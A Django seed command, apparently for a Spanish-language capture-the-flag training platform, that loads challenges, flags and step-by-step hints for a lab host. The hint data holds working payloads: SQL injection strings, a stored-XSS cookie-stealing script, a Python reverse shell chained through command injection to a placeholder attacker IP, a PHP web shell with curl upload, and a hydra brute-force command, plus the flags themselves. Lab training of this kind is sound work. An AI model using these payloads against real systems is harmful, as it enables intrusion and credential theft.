"""Comando de datos de prueba: crea categorias, movimientos y retos.

Es idempotente: se puede ejecutar varias veces sin duplicar registros.

    python manage.py sembrar_datos
    python manage.py sembrar_datos --limpiar   # borra retos que no esten aqui

La URL de los servicios de reto se toma de la variable HOST_RETOS
(por defecto http://192.168.56.77).
"""
import os

from django.core.management.base import BaseCommand
from django.db import transaction

from apps.retos.cube_engine import MOVIMIENTOS
from apps.retos.models import (
    Categoria,
    MovimientoCubo,
    MovimientoReto,
    Pista,
    PreguntaMascota,
    Reto,
)

BASE_RETOS = os.environ.get("HOST_RETOS", "http://192.168.56.77").rstrip("/")
HOST = BASE_RETOS.replace("http://", "").replace("https://", "")

CATEGORIAS = [
    ("Web", "web", "#2ecc71", 1),
    ("Criptografia", "criptografia", "#ff3b3b", 2),
    ("Redes", "redes", "#2f80ed", 3),
    ("Forense", "forense", "#ffd23f", 4),
    ("Reversing", "reversing", "#ff8c1a", 5),
    ("OSINT / Esteganografia", "osint", "#f2f2f2", 6),
]

# (nombre, slug, categoria, dificultad, puntos, flag, [movimientos], descripcion, objetivo)
RETOS = [
    (
        "Acceso al panel",
        "acceso-al-panel",
        "web",
        "facil",
        150,
        "RUBIK{sql_injection_101}",
        ["L"],
        "Un panel de administracion tiene un login vulnerable a SQL Injection. "
        f"El servicio esta en {BASE_RETOS}:8001. Encuentra la flag en su base de datos.",
        f"{BASE_RETOS}:8001",
    ),
    (
        "Credenciales en el PCAP",
        "credenciales-pcap",
        "redes",
        "media",
        400,
        "RUBIK{pcap_basic_auth}",
        ["R2"],
        "Se capturo trafico HTTP de un login. Abre el PCAP con Wireshark, "
        "sigue el flujo y recupera las credenciales (Basic auth).",
        f"{BASE_RETOS}/recursos/credenciales-pcap/captura.pcap",
    ),
    (
        "Puerto inesperado",
        "puerto-inesperado",
        "redes",
        "facil",
        200,
        "RUBIK{hidden_port}",
        ["F2"],
        f"El servicio esta en {HOST}:31337. Identificalo con nmap (-sV) y "
        "conectate para leer su banner; encontraras la flag.",
        "",
    ),
    (
        "Banner revelador",
        "banner-revelador",
        "redes",
        "media",
        350,
        "RUBIK{service_banner}",
        ["B'"],
        f"El servicio esta en {HOST}:8003. Escanealo con nmap -sV; la version "
        "del servicio revela la flag.",
        f"{BASE_RETOS}:8003",
    ),
    (
        "XSS almacenado",
        "xss-almacenado",
        "web",
        "media",
        400,
        "RUBIK{stored_xss_101}",
        ["R'"],
        f"El servicio esta en {BASE_RETOS}:8004. Es un libro de visitas. "
        "Publica un comentario que robe la cookie del bot administrador.",
        f"{BASE_RETOS}:8004",
    ),
    (
        "Banco central",
        "banco-central",
        "web",
        "media",
        500,
        "RUBIK{sqli_banco_luis_miguel}",
        ["D2"],
        f"El buscador de clientes del banco esta en {BASE_RETOS}:8005 y es "
        "vulnerable a SQL Injection. Hay una tabla de credenciales; el usuario "
        "'luis.miguel' tiene su contrasena en Base64. Decodificala para obtener la flag.",
        f"{BASE_RETOS}:8005",
    ),
    (
        "Diagnostico de red",
        "diagnostico-red",
        "web",
        "dificil",
        700,
        "RUBIK{reverse_shell_vault}",
        ["F"],
        f"La consola de diagnostico de AuroraVault esta en {BASE_RETOS}:8006 y "
        "ejecuta comandos del sistema (la salida no se muestra). El contenedor "
        "no tiene bash ni netcat: consigue una reverse shell con PTY usando "
        "python3 y lee /flag.txt.",
        f"{BASE_RETOS}:8006",
    ),
    (
        "Receta manipulada",
        "receta-manipulada",
        "web",
        "media",
        450,
        "RUBIK{file_upload_doble_extension}",
        ["F'"],
        f"El portal de recetas de Clinica Vita esta en {BASE_RETOS}:8007. Solo "
        "acepta imagenes o PDF y bloquea las extensiones .php... o eso parece. "
        "Consigue ejecutar codigo en el servidor y lee /flag.txt.",
        f"{BASE_RETOS}:8007",
    ),
    (
        "Extranet de Nexora",
        "extranet-hydra",
        "web",
        "media",
        400,
        "RUBIK{hydra_extranet}",
        ["U2"],
        f"Incidente Boreal: una campana de phishing filtro una lista de "
        f"contrasenas antiguas de Nexora. La cuenta 'admin' de la extranet "
        f"({BASE_RETOS}:8009) nunca se roto y usa una de esas contrasenas. "
        "Descarga /lista.txt, fuerza el login con hydra (http-post-form; la "
        "respuesta correcta NO contiene 'incorrectas') y recupera el codigo "
        "de auditoria del panel.",
        f"{BASE_RETOS}:8009",
    ),
]

# slug -> datos de la ayuda (pregunta + pista + pasos + comando + minijuego)
MASCOTA = {
    "acceso-al-panel": {
        "pregunta": "¿Qué palabra clave SQL une los resultados de dos consultas?",
        "respuesta": "union",
        "tema": "sql",
        "pista": "El login concatena tu usuario. Cierra la comilla y comenta el resto con -- para saltarte la contraseña.",
        "pasos": "1) Abre el login. 2) En Usuario escribe admin' -- (con un espacio al final). 3) En Contraseña pon cualquier cosa. 4) Copia la flag del panel.",
        "comando": "admin' --",
        "minijuego": "ordenar",
    },
    "credenciales-pcap": {
        "pregunta": "¿Qué esquema de autenticación HTTP envía usuario:contraseña codificado en Base64?",
        "respuesta": "basic",
        "tema": "http",
        "pista": "En Wireshark filtra por http y busca la cabecera Authorization; después decodifica el Base64.",
        "pasos": "1) Descarga el PCAP. 2) Filtra 'http' en Wireshark. 3) Follow TCP Stream. 4) Copia el valor de Basic y decodifícalo.",
        "comando": "echo YWRtaW46UlVCSUt7cGNhY19iYXNpY19hdXRofQ== | base64 -d",
        "minijuego": "simon",
    },
    "puerto-inesperado": {
        "pregunta": "¿Qué protocolo orientado a conexión devuelve un banner al conectar a un puerto?",
        "respuesta": "tcp",
        "tema": "redes",
        "pista": "Escanea todos los puertos con nmap y conecta con nc al que no esperabas; el banner trae la flag.",
        "pasos": "1) Escanea todos los puertos del host. 2) Conéctate al 31337 con nc. 3) Lee el banner.",
        "comando": "nmap -p- 192.168.56.77",
        "minijuego": "ordenar",
    },
    "banner-revelador": {
        "pregunta": "¿Qué opción de nmap (sin el guion) detecta la versión de los servicios?",
        "respuesta": "sv",
        "tema": "redes",
        "pista": "Usa la detección de versiones; la cabecera del servidor delata la flag.",
        "pasos": "1) Detecta la versión con nmap -sV. 2) Mira la cabecera Server. 3) Lee la flag.",
        "comando": "nmap -sV -p 8003 192.168.56.77",
        "minijuego": "ordenar",
    },
    "xss-almacenado": {
        "pregunta": "¿Qué objeto de JavaScript contiene las cookies de la página?",
        "respuesta": "document.cookie",
        "tema": "xss",
        "pista": "El comentario se guarda sin escapar. Haz que el bot envíe su cookie al libro.",
        "pasos": "1) Abre el reto desde la plataforma (para tener tu usuario). 2) Publica el HTML como comentario. 3) Espera ~15 s y recarga. 4) Lee el comentario del bot.",
        "comando": (
            "<script>fetch('/comentario',{method:'POST',headers:"
            "{'Content-Type':'application/x-www-form-urlencoded'},"
            "body:'autor=bot&texto='+encodeURIComponent(document.cookie)})</script>"
        ),
        "minijuego": "paciencia",
    },
    "banco-central": {
        "pregunta": "¿Qué palabra clave SQL une el resultado de otra consulta al original?",
        "respuesta": "union",
        "tema": "sql",
        "pista": "El buscador es inyectable. Con UNION puedes leer la tabla de credenciales.",
        "pasos": "1) Pega el UNION en el buscador. 2) Localiza luis.miguel. 3) Copia su password_b64 y decodifícala con base64 -d.",
        "comando": "' UNION SELECT 1, usuario, password_b64 FROM credenciales --",
        "minijuego": "ordenar",
    },
    "diagnostico-red": {
        "pregunta": "¿Qué carácter permite encadenar comandos en la shell de Linux? (escríbelo)",
        "respuesta": ";",
        "tema": "linux",
        "pista": "La entrada se pega a un comando. Encadena el tuyo y ábrete una shell con Python y PTY.",
        "pasos": "1) Escucha con nc -lvnp 4444 en Kali. 2) Pega el payload en el campo host (cambia IP_KALI). 3) En la shell ejecuta cat /flag.txt.",
        "comando": '''127.0.0.1; python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("IP_KALI",4444));[os.dup2(s.fileno(),f) for f in (0,1,2)];pty.spawn("/bin/sh")' &''',
        "minijuego": "paciencia",
    },
    "receta-manipulada": {
        "pregunta": "¿Qué lenguaje se ejecuta en el servidor con extensión .php?",
        "respuesta": "php",
        "tema": "web",
        "pista": "Solo se valida la última extensión. Prueba una doble extensión como receta.php.jpg.",
        "pasos": "1) Crea receta.php.jpg con el PHP. 2) Súbelo. 3) Abre /uploads/receta.php.jpg?c=id y luego ?c=cat /flag.txt.",
        "comando": '''<?php system($_GET['c']); ?>

curl -F "archivo=@receta.php.jpg" http://192.168.56.77:8007/
curl "http://192.168.56.77:8007/uploads/receta.php.jpg?c=cat%20/flag.txt"''',
        "minijuego": "ppt",
    },
    "extranet-hydra": {
        "pregunta": "¿Qué herramienta de Kali se usa para fuerza bruta de formularios?",
        "respuesta": "hydra",
        "tema": "fuerza bruta",
        "pista": "Descarga la lista filtrada y prueba con Hydra; la respuesta correcta no contiene 'incorrectas'.",
        "pasos": "1) Descarga /lista.txt. 2) Ejecuta el comando de Hydra. 3) Entra con la contraseña encontrada.",
        "comando": 'hydra -l admin -P lista.txt -s 8009 -f 192.168.56.77 http-post-form "/login:usuario=^USER^&contrasena=^PASS^:S=Confidencial"',
        "minijuego": "ordenar",
    },
}


class Command(BaseCommand):
    help = "Crea categorias, movimientos y retos (idempotente)."

    def add_arguments(self, parser):
        parser.add_argument(
            "--limpiar",
            action="store_true",
            help="Elimina los retos que no esten definidos en este seed.",
        )

    @transaction.atomic
    def handle(self, *args, **options):
        categorias = {}
        for nombre, slug, color, orden in CATEGORIAS:
            categoria, _ = Categoria.objects.update_or_create(
                slug=slug,
                defaults={"nombre": nombre, "color": color, "orden": orden, "activa": True},
            )
            categorias[slug] = categoria
        self.stdout.write(f"Categorias: {len(categorias)}")

        for notacion in MOVIMIENTOS:
            MovimientoCubo.objects.get_or_create(notacion=notacion)
        self.stdout.write(f"Movimientos: {MovimientoCubo.objects.count()}")

        creados = 0
        for (
            nombre,
            slug,
            categoria_slug,
            dificultad,
            puntos,
            flag,
            movimientos,
            descripcion,
            objetivo,
        ) in RETOS:
            reto, creado = Reto.objects.update_or_create(
                slug=slug,
                defaults={
                    "nombre": nombre,
                    "descripcion": descripcion,
                    "objetivo": objetivo,
                    "categoria": categorias[categoria_slug],
                    "dificultad": dificultad,
                    "puntos": puntos,
                    "activo": True,
                },
            )
            if creado:
                reto.establecer_flag(flag)
                reto.save(update_fields=["hash_flag"])
                for orden, notacion in enumerate(movimientos):
                    MovimientoReto.objects.create(
                        reto=reto,
                        movimiento=MovimientoCubo.objects.get(notacion=notacion),
                        orden=orden,
                    )
                creados += 1

        # Mascota: pregunta + pistas/pasos/comando por reto.
        for slug, datos in MASCOTA.items():
            reto = Reto.objects.filter(slug=slug).first()
            if not reto:
                continue
            pista, _ = Pista.objects.update_or_create(
                reto=reto,
                orden=0,
                defaults={
                    "texto": datos["pista"],
                    "pasos": datos["pasos"],
                    "comando": datos["comando"],
                    "minijuego": datos["minijuego"],
                    "coste": 0,
                    "activa": True,
                },
            )
            PreguntaMascota.objects.update_or_create(
                pista=pista,
                defaults={
                    "texto": datos["pregunta"],
                    "respuesta": datos["respuesta"],
                    "tema": datos["tema"],
                    "activa": True,
                },
            )

        if options.get("limpiar"):
            slugs_validos = [reto[1] for reto in RETOS]
            sobrantes = Reto.objects.exclude(slug__in=slugs_validos)
            eliminados = list(sobrantes.values_list("slug", flat=True))
            sobrantes.delete()
            self.stdout.write(
                self.style.WARNING(f"Retos eliminados: {eliminados or 'ninguno'}")
            )

        self.stdout.write(
            self.style.SUCCESS(
                f"Retos creados: {creados} (existentes actualizados si hacia falta). "
                f"Total retos: {Reto.objects.count()}"
            )
        )
